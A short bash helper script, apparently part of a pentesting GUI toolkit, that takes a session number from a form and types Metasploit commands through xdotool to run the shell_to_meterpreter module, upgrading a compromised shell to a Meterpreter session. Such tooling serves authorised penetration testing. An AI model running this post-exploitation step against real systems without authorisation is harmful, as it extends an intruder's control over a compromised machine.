#!/bin/bash

: '
meterpreter:  upgrade shell to meterpreter
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SESSION_FIELD=$(form_item  "SESSION" "number" "SESSION" "-1")

# Generate GUI form
generate_form "${SESSION_FIELD}" 

SESSION=${form_data["SESSION"]}

paste_command "use multi/manage/shell_to_meterpreter"
xdotool key Return
sleep 1

paste_command "set SESSION ${SESSION}"
xdotool key Return
sleep 0.8

paste_command "run"
xdotool key Return
